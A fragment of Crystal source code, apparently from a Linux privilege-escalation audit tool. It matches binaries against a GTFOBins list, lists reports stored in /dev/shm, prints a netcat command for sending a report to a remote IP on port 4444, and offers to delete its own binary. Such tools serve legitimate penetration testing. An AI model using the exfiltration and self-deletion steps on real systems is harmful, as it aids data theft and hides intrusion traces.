def gtfo_match(path : String) : String?
  binary = File.basename(path).downcase
  base   = binary.gsub(/[\d.]+$/, "")
  return binary if GTFOBINS.includes?(binary)
  return base   if GTFOBINS.includes?(base)
  nil
end

def list_reports
  tee("#{Y}Report files in /dev/shm:#{RS}")
  reports = run_lines("ls -lh /dev/shm/audit-report_* 2>/dev/null")
  if reports.empty?
    info("No report files found in /dev/shm")
  else
    reports.each { |r| info("  #{r}") }
    blank
    info("View:  less -R /dev/shm/audit-report_<user>_<ts>.txt")
    info("Copy:  nc <remote-ip> 4444 < /dev/shm/audit-report_<user>_<ts>.txt")
  end
end

def self_destruct
  Out.prompt("#{R}[!] Delete the binary? Report files will be kept. (y/N): #{RS}")
  answer = gets.try(&.chomp.downcase) || ""
  if answer == "y"
    if path = Process.executable_path
      File.delete(path)
      tee("#{G}Binary deleted: #{path}#{RS}")
      tee("#{B}Report files in /dev/shm are preserved.#{RS}")
    end
  else
    tee("#{Y}Self-destruct cancelled.#{RS}")
  end
rescue ex : IO::Error | File::Error
  tee("#{R}Error during self-destruct: #{ex.message}#{RS}")
end
